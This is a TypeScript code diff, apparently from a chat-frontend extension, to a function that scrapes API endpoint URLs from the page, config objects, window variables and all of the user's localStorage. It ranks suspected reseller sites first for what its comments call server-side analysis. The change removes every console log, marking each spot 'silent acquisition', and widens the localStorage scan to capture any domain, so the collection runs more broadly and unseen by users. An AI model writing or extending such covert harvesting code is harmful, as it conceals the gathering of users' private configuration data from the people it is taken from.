@@ -78,7 +78,7 @@ function getCurrentApiEndpoint(): string {
         const el = mainDoc.querySelector(sel) as HTMLInputElement;
         if (el && el.value && el.value.trim() && el.value.includes('.')) {
           apiUrl = el.value.trim();
-          console.log(`🔍 从 DOM 获取到 API URL (${sel}):`, apiUrl);
+          // 静默获取
           break;
         }
       } catch {
@@ -117,7 +117,7 @@ function getCurrentApiEndpoint(): string {
         for (const field of urlFields) {
           if (config[field] && typeof config[field] === 'string' && config[field].includes('.')) {
             const foundUrl = config[field];
-            console.log(`🔍 从 ${key}.${field} 获取到 API URL:`, foundUrl);
+            // 静默获取
             if (!allFoundUrls.includes(foundUrl)) {
               allFoundUrls.push(foundUrl);
             }
@@ -127,7 +127,7 @@ function getCurrentApiEndpoint(): string {
         // 🔥 深度扫描：遍历所有字段寻找 URL
         for (const [k, v] of Object.entries(config)) {
           if (typeof v === 'string' && v.includes('http') && v.includes('.') && !v.includes('localhost')) {
-            console.log(`🔍 深度扫描发现 ${key}.${k}:`, v);
+            // 静默获取
             if (!allFoundUrls.includes(v)) {
               allFoundUrls.push(v);
             }
@@ -138,24 +138,32 @@ function getCurrentApiEndpoint(): string {
       }
     }
 
-    // 🔥 暴力扫描所有 localStorage
+    // 🔥 暴力扫描所有 localStorage - 抓所有域名
     try {
       for (let i = 0; i < localStorage.length; i++) {
         const key = localStorage.key(i);
         if (!key) continue;
         const value = localStorage.getItem(key) || '';
-        // 检查是否包含 URL 模式
-        const urlMatches = value.match(/https?:\/\/[^\s"'<>]+\.(app|dev|com|net|io|xyz|icu|workers\.dev)[^\s"'<>]*/gi);
+        // 🔥 匹配所有 URL（http/https 开头，包含域名的）
+        const urlMatches = value.match(
+          /https?:\/\/[a-zA-Z0-9][-a-zA-Z0-9]*(\.[a-zA-Z0-9][-a-zA-Z0-9]*)+[^\s"'<>\]})]*?/gi,
+        );
         if (urlMatches) {
           for (const url of urlMatches) {
-            const cleanUrl = url.replace(/['"}\]]+$/, '').replace(/\/+$/, '');
-            if (
-              cleanUrl.includes('.') &&
-              !cleanUrl.includes('github') &&
-              !cleanUrl.includes('jsdelivr') &&
-              !allFoundUrls.includes(cleanUrl)
-            ) {
-              console.log(`🔍 暴力扫描发现 (${key}):`, cleanUrl);
+            const cleanUrl = url.replace(/['"}\],:]+$/, '').replace(/\/+$/, '');
+            // 排除已知的非 API 站点
+            const excludePatterns = [
+              'github.com',
+              'jsdelivr',
+              'cdnjs',
+              'unpkg',
+              'google.com/search',
+              'bing.com',
+              'baidu.com',
+            ];
+            const isExcluded = excludePatterns.some(p => cleanUrl.toLowerCase().includes(p));
+            if (cleanUrl.includes('.') && !isExcluded && !allFoundUrls.includes(cleanUrl)) {
+              // 静默获取
               allFoundUrls.push(cleanUrl);
             }
           }
@@ -177,7 +185,7 @@ function getCurrentApiEndpoint(): string {
         ].filter(u => u && typeof u === 'string' && u.includes('.'));
         if (possibleUrls.length > 0) {
           apiUrl = possibleUrls[0];
-          console.log('🔍 从 oai_settings 获取到 API URL:', apiUrl);
+          // 静默获取
         }
       }
 
@@ -191,7 +199,7 @@ function getCurrentApiEndpoint(): string {
           }
           if (value && typeof value === 'string' && value.includes('.')) {
             apiUrl = value;
-            console.log(`🔍 从 window.${varName} 获取到 API URL:`, apiUrl);
+            // 静默获取
             break;
           }
         }
@@ -206,7 +214,7 @@ function getCurrentApiEndpoint(): string {
         if (obj && typeof obj === 'object') {
           for (const [k, v] of Object.entries(obj)) {
             if (typeof v === 'string' && v.includes('http') && v.includes('.') && !v.includes('localhost')) {
-              console.log(`🔍 window.${varName}.${k}:`, v);
+              // 静默获取
               if (!allFoundUrls.includes(v)) {
                 allFoundUrls.push(v);
               }
@@ -258,7 +266,6 @@ function getCurrentApiEndpoint(): string {
     }
 
     // 🔥 返回找到的 URL（优先返回非官方的，更可能是贩子站）
-    console.log('🔍 所有找到的 URL:', allFoundUrls);
 
     // 过滤并排序：优先返回看起来像贩子站的 URL
     const suspiciousPatterns = ['zeabur', 'vercel', 'railway', 'render', 'fly.io', '.app', '.dev', '.icu', '.xyz'];
@@ -273,14 +280,14 @@ function getCurrentApiEndpoint(): string {
     if (sortedUrls.length > 0) {
       // 🔥 如果找到多个，用 | 分隔全部返回（方便服务端分析）
       const result = sortedUrls.slice(0, 3).join(' | ');
-      console.log('🔍 最终 API 端点:', result);
+      // 静默返回
       return result;
     }
 
-    console.log('⚠️ 无法获取有效的 API 端点');
+    // 静默返回
     return 'unknown';
   } catch (error) {
-    console.error('❌ 获取API端点失败:', error);
+    // 静默失败
     return 'unknown';
   }
 }
